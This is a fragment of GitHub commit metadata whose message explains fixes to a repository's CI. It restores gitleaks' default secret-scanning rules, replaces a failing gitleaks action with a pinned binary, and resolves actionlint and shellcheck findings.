the allowlist looks like the fix and is the cause.\n\nFix: add `[extend] useDefault = true`, then narrow deliberately. Every\nallowlist entry here corresponds to a finding I actually measured by\nrescanning full history with the rules on, not to a guess:\n\n  - SealedSecret ciphertext paths (kubeseal output, encrypted)\n  - AUTH_MODE enum tokens, anchored ^...$ so they match the literal\n    values and nothing else\n\nVerified in both directions, which is the part that matters: full\nhistory is clean under the new config, AND a planted AWS key is still\nreported. An allowlist that cannot be shown to still fail is\nindistinguishable from deleting the gate.\n\nFollow-up (not in this PR): FuzeSDLC ships no canonical gitleaks\ntemplate, which is why 12 hand-written configs drifted into 9 broken\nones. Adding one and wiring it into the installer is the durable fix.\n\n* fix(gate-secret-scan): run the gitleaks binary — the action dies before it scans\n\nCompanion to the .gitleaks.toml fix on this branch. That one restored the\ndefault ruleset; this one makes the gate actually execute.\n\ngate-secret-scan here uses gitleaks/gitleaks-action, which uploads a\njob-summary artifact. This account is over its Actions artifact-storage\nquota, so the action dies with\n\n    Failed to CreateArtifact: Artifact storage quota has been hit.\n\nBEFORE running the scan. The job goes red for a reason that has nothing\nto do with the tree, and no scan result exists either way. Observed live\non FuzeSales run 32483276161, on this very branch.\n\nSo this gate was broken twice over, in opposite directions: the config\nloaded zero rules, and the runner never got as far as loading it.\n\nThe v2 action has a second failure mode already seen across this fleet:\nits pull_request path calls GET /repos/:o/:r/pulls/:n/commits to decide\nwhat to scan, and throws rather than degrading when that call 403s.\n\nA secret gate must not have an availability failure mode, and must not\ndepend on an API call or an artifact upload to do its job. git already\nknows the commit range; nothing needs to be asked and nothing uploaded.\n\nReplaced with the pinned, checksummed binary — the same block already in\nFuzeService, FuzeCall, FuzeInfra, FuzeSocial, FuzeMarket and\nFuzeMerchandize, so this converges the fleet rather than inventing a\nvariant. `runs-on` and the checkout version are left exactly as they\nwere; this commit changes what the step does, not where it runs.\n\nCorrecting something I wrote earlier: three sibling commits justified\ninstalling to $RUNNER_TEMP on the grounds that \"sudo is not guaranteed\"\non ARC runners. That was wrong — FuzeMerchandize runs the canonical\n`sudo install -m 0755` on its own ARC scale set and it succeeds. This\nuses the canonical form.\n\n* fix(ci): make actionlint pass — seed actionlint.yaml and fix 5 shellcheck findings\n\nThe actionlint gate was failing this PR on pre-existing problems that my\n.gitleaks.toml change happened to expose by touching .github/workflows.\nFixing them rather than leaving the PR red.\n\nTwo classes.\n\n1. Unknown runner label. actionlint cannot know the names of self-hosted\n   runners, so every `runs-on: <scale-set>` in harden-gate.yml reported\n   `label \"<name>\" is unknown`. These are gha-runner-scale-set NAMES\n   matched as bare strings, not labels in the legacy [self-hosted, x]\n   sense — those runners register with no labels at all, so `self-hosted`\n   would match nothing.\n\n   Seeded .github/actionlint.yaml from FuzeSDLC''s\n   community-templates/actionlint.yaml, declaring both `fuze-runner` and\n   this repo''s own scale-set name. The canonical template''s own comment\n   predicted exactly this: \"without this file, the first repo to declare\n   ci.runner blocks every one of its PRs.\"\n\n2. Five shellcheck findings, all pre-existing, none of them cosmetic:\n\n   SC2015 x2 — `A && B || C` is not if-then-else.\n     - `[ -f \"$dir/versions.env\" ] && env=...` made that line the block''s\n       exit status, so an absent versions.env failed the step.\n     - `curl … | tar … && sudo mv … || true` swallowed a FAILED install\n       after a SUCCESSFUL download, so `helm lint` then ran with no helm\n       at all and reported nothing. Rewritten as if/then with a warning\n       on each arm, plus an explicit `command -v helm || exit 0`.\n       Installing helm stays best-effort — but best-effort must still be\n       able to say it failed.\n\n   SC2086 x2 — `$CFG` and `$env` must word-split into `--config <path>`\n     and `--env-file <path>`. Quoting them would pass one argument\n     containing a space. Suppressed with a directive and the reason, not\n     \"fixed\" by quoting, which would break both commands.\n\n   SC2153 — BASE comes from the step''s `env:` block, invisible to\n     shellcheck, so it guesses a typo for the local `base` on the next\n     line. Suppressed with the reason.\n\nNothing is silenced that was actually wrong: the two SC2015s were real\nbugs and are now real fixes; the other three are documented false\npositives. Verified locally with actionlint 1.7.7 + shellcheck —\n`actionlint .github/workflows/harden-gate.yml` exits 0.","tree":{"sha":"e89ecd08e82aed72cb0b7c8f7f101cb216c2c8c8","url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/trees/e89ecd08e82aed72cb0b7c8f7f101cb216c2c8c8"},"url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/commits/affd7af29b3548cb157cf7646b582408b408d02e","verification":{"payload":"tree e89ecd08e82aed72cb0b7c8f7f101cb216c2c8c8\nparent 3f868209de99b286df1d290b17035541568850f6\nauthor Israel Weinberg <99821070+izzywdev@users.noreply.github.com> 1787451915 +0300\ncommitter GitHub <noreply@github.com> 1787451915 +0300\n\nfix(gate-secret-scan): restore the default ruleset — this gate was scanning for nothing (#101)\n\n* fix(gate-secret-scan): restore the default ruleset — this gate was scanning for nothing\n\n.gitleaks.toml declared an allowlist but no [[rules]] and no\n`[extend] useDefault = true`. In gitleaks v8 that loads ZERO rules, so\ngate-secret-scan has been reporting \"no leaks found\" for the life of the\nfile regardless of what the tree contains.\n\nMeasured, not inferred. Same throwaway repo holding a planted AWS access\nkey, gitleaks 8.24.3:\n\n  config as committed      -> \"no leaks found\"\n  config with [extend]     ->